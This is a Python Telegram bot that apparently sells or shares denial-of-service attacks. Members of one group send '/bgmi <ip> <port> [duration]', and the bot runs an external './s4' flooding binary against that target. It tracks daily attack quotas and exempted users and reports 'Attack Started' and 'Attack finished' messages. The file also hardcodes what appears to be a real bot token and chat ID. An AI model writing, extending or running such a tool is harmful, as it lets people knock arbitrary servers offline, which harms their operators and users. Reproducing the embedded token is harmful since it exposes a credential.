import os
import telebot
import logging
import subprocess # For running the attack command
import threading  # For running the attack command in a non-blocking way
from datetime import datetime, timezone, timedelta

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Telegram bot token and channel ID
TOKEN = '7573584761:AAEk2BovHRPZGkUvC8YluzJUTBpHCHpdiGw'  # Replace with your actual bot token
CHANNEL_ID = '-4665788052'  # Replace with your specific channel or group ID

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts and active attacks
user_attacks = {}  # Stores user_id: count
active_attacks = {} # Stores (ip, port): True for currently running attacks

# Timezone and reset time management
IST = timezone(timedelta(hours=5, minutes=30))
# reset_time stores the beginning of the current 24-hour counting period in IST.
# Counts are valid for the day starting at reset_time.
current_ist_time = datetime.now(IST)
reset_time = current_ist_time.replace(hour=0, minute=0, second=0, microsecond=0)

# Daily attack limit per user
DAILY_ATTACK_LIMIT = 20
DEFAULT_DURATION = 120  # Default attack duration in seconds
MIN_DURATION = 30       # Minimum allowed duration for an attack
MAX_DURATION = 120      # Maximum allowed duration for an attack
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# List of user IDs exempted from limits
EXEMPTED_USERS = [2032164136]

def get_user_display_name(user):
    """Generates a display name for the user."""
    if user.first_name:
        return user.first_name
    if user.username:
        return user.username
    return f"User_{user.id}"

def reset_daily_counts():
    """Reset the daily attack counts if the current time is past the scheduled reset time."""
    global reset_time, user_attacks
    
    now_ist = datetime.now(IST)
    # The current counting period ends 1 day after `reset_time`.
    # If `now_ist` is on or after this end point, a new period begins.
    if now_ist >= reset_time + timedelta(days=1):
        logger.info("Resetting daily attack counts for all users.")
        user_attacks.clear()
        # Update reset_time to the start of the new current day in IST
        reset_time = now_ist.replace(hour=0, minute=0, second=0, microsecond=0)
        logger.info(f"New counting period started at: {reset_time.strftime('%Y-%m-%d %H:%M:%S %Z')}")
        # Note: active_attacks is NOT cleared here, as it tracks currently running processes,
        # not daily quotas. An attack might span across midnight.

# Function to validate IP address
def is_valid_ip(ip_str):
    parts = ip_str.split('.')
    if len(parts) != 4:
        return False
    return all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port_str):
    if not port_str.isdigit():
        return False
    port = int(port_str)
    if not (0 <= port <= 65535): # Standard port range
        return False
    if port in BLOCKED_PORTS:
        return False
    return True

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global user_attacks, active_attacks
    
    user_id = message.from_user.id
    user_display_name = get_user_display_name(message.from_user)

    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, "⚠️ This Bot Can Only Be Used in A Specific Group. \n\nJoin Now -> @YOURxDEMONxYT")
        return

    reset_daily_counts()

    if user_id not in EXEMPTED_USERS:
        if user_id not in user_attacks:
            user_attacks[user_id] = 0
        
        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(message.chat.id, f"Hi {user_display_name}, you've reached your daily attack limit of {DAILY_ATTACK_LIMIT}.")
            return

    args = message.text.split()[1:]
    if len(args) < 2: # IP and Port are mandatory
        bot.send_message(message.chat.id, "𝗣𝗿𝗼𝘃𝗶𝗱𝗲: /bgmi <target_ip> <target_port>")
        return

    target_ip = args[0]
    target_port_str = args[1]
    
    attack_duration = DEFAULT_DURATION
    if len(args) >= 3:
        try:
            duration_arg = int(args[2])
            if MIN_DURATION <= duration_arg <= MAX_DURATION:
                attack_duration = duration_arg
            else:
                bot.send_message(message.chat.id, f"🕒 Duration must be between {MIN_DURATION} and {MAX_DURATION} seconds.")
                return
        except ValueError:
            bot.send_message(message.chat.id, "🕒 Invalid duration format. Please provide a number of seconds.")
            return

    if not is_valid_ip(target_ip):
        bot.send_message(message.chat.id, "⚠️ Invalid IP address format.")
        return
    
    if not is_valid_port(target_port_str):
        bot.send_message(message.chat.id, f"🚫 Port {target_port_str} is invalid or blocked. Please use a different port.")
        return
    
    target_port_int = int(target_port_str)

    if active_attacks: # Global lock: only one attack at a time
        bot.send_message(message.chat.id, "⏳ Another attack is already in progress. Please wait for it to complete.")
        return

    attack_key = (target_ip, target_port_int)
    active_attacks[attack_key] = True

    if user_id not in EXEMPTED_USERS:
        user_attacks[user_id] += 1

    bot.send_message(
        message.chat.id,
        f"🚀 Attack Started!\n\n"
        f"🎯 Target IP: {target_ip}\n"
        f"🔌 Port: {target_port_int}\n"
        f"⏳ Duration: {attack_duration} seconds\n"
        f"👤 Initiated by: {user_display_name}"
    )
    
    attack_thread = threading.Thread(
        target=run_attack_command,
        args=(target_ip, target_port_int, attack_duration, user_display_name, attack_key)
    )
    attack_thread.start()

def run_attack_command(target_ip, target_port, duration, user_display_name, attack_key):
    global active_attacks
    
    try:
        # Assumes 's4' is an executable file in the current working directory or in PATH.
        # Using './s4' explicitly means it must be in the CWD.
        command = ["./s4", target_ip, str(target_port), str(duration), "477"]
        logger.info(f"Executing attack command by {user_display_name}: {' '.join(command)}")

        process = subprocess.run(command, capture_output=True, text=True, check=False)

        if process.returncode == 0:
            logger.info(f"Attack on {target_ip}:{target_port} by {user_display_name} completed successfully. Output: {process.stdout or '[No stdout]'}")
            bot.send_message(CHANNEL_ID, f"✅ Attack finished ✅ \n\n{target_ip}:{target_port} \n{user_display_name}\n\n*Team S4 official*")
        else:
            error_message = process.stderr or process.stdout or "Unknown error, non-zero exit code."
            logger.error(f"Attack command on {target_ip}:{target_port} by {user_display_name} failed. RC: {process.returncode}. Error: {error_message}")
            bot.send_message(CHANNEL_ID, f"⚠️ Attack on {target_ip}:{target_port} by {user_display_name} failed. Error: {error_message[:1000]}") # Limit error message length

    except FileNotFoundError:
        logger.error("Error: The './s4' executable was not found. Attack cannot be performed.")
        bot.send_message(CHANNEL_ID, "❌ Critical Error: Attack script './s4' not found. Please contact admin.")
    except Exception as e:
        logger.error(f"An unexpected error occurred while running attack command for {target_ip}:{target_port} by {user_display_name}: {e}", exc_info=True)
        bot.send_message(CHANNEL_ID, f"❌ An unexpected error occurred during the attack on {target_ip}:{target_port} by {user_display_name}.")
    finally:
        active_attacks.pop(attack_key, None)
        logger.info(f"Attack on {attack_key} (by {user_display_name}) marked as finished. Active attacks: {len(active_attacks)}")

if __name__ == "__main__":
    logger.info("Bot is starting...")
    
    # Startup check for the attack script
    s4_path = "./s4"
    if not os.path.exists(s4_path):
        logger.critical(f"CRITICAL: Attack script '{s4_path}' not found. Attacks will fail. Please ensure it's in the correct directory.")
    elif not os.access(s4_path, os.X_OK):
        logger.critical(f"CRITICAL: Attack script '{s4_path}' is not executable. Please run 'chmod +x {s4_path}'. Attacks will fail.")
    
    try:
        logger.info(f"Bot configured for Channel ID: {CHANNEL_ID}")
        logger.info(f"Daily attack limit: {DAILY_ATTACK_LIMIT} (Exempted users: {EXEMPTED_USERS})")
        logger.info(f"Attack duration: Default {DEFAULT_DURATION}s, Min {MIN_DURATION}s, Max {MAX_DURATION}s")
        logger.info(f"Blocked ports: {BLOCKED_PORTS}")
        bot.polling(none_stop=True, interval=0) # interval=0 polls as fast as possible
    except Exception as e:
        logger.critical(f"Bot polling failed critically: {e}", exc_info=True)